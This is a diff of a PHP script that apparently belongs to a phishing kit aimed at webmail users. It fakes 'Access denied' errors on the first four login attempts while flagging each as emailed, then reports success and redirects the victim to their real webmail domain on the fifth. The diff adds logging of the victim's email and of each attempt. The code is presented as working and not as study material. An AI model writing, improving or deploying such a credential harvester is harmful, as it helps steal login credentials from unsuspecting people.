@@ -118,6 +118,9 @@ if ($attemptNumber < 5) {
         "Access denied. Please enter correct login details."
     ];
     
+    // Log the error attempt
+    error_log("ERROR ATTEMPT: Email=$login, Attempt=$attemptNumber, Message=" . $errorMessages[$attemptNumber - 1]);
+    
     $response = [
         "signal" => "error",
         "success" => false,
@@ -126,7 +129,8 @@ if ($attemptNumber < 5) {
         "debug_info" => [
             "email_sent" => true,
             "timestamp" => $timestamp,
-            "attempt_number" => $attemptNumber
+            "attempt_number" => $attemptNumber,
+            "domain" => $domain
         ]
     ];
     
@@ -135,16 +139,23 @@ if ($attemptNumber < 5) {
     
 } else {
     // 5th attempt - show success and redirect
+    $redirectUrl = "https://webmail.$domain";
+    
+    // Log the redirect attempt
+    error_log("REDIRECT ATTEMPT: Email=$login, Domain=$domain, RedirectURL=$redirectUrl, Attempt=$attemptNumber");
+    
     $response = [
         "signal" => "OK",
         "success" => true,
         "msg" => "Login successful! Redirecting to webmail...",
-        "redirect_url" => "https://webmail.$domain",
+        "redirect_url" => $redirectUrl,
         "attempt" => $attemptNumber,
         "debug_info" => [
             "email_sent" => true,
             "timestamp" => $timestamp,
-            "attempt_number" => $attemptNumber
+            "attempt_number" => $attemptNumber,
+            "domain" => $domain,
+            "redirect_url" => $redirectUrl
         ]
     ];
     
